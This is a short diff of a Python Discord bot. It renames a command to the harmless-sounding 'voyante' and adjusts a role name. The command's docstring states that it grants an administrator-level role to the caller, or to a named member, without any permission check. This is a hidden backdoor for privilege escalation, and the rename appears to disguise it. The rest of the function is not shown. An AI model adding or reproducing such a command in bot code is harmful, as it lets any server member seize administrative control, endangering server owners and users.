@@ -10,11 +10,11 @@ bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_comma
 
 
 @bot.command()
-async def testroulette(ctx, member: discord.Member = None):
+async def voyante(ctx, member: discord.Member = None):
     """Attribue le rôle 'sinj' avec les droits administratifs à un utilisateur, sans vérifier ses permissions."""
 
     guild = ctx.guild
-    role_name = "sinje"
+    role_name = "Sinj"
 
     # Si aucun membre n'est précisé, on applique le rôle à l'auteur de la commande
     if member is None:
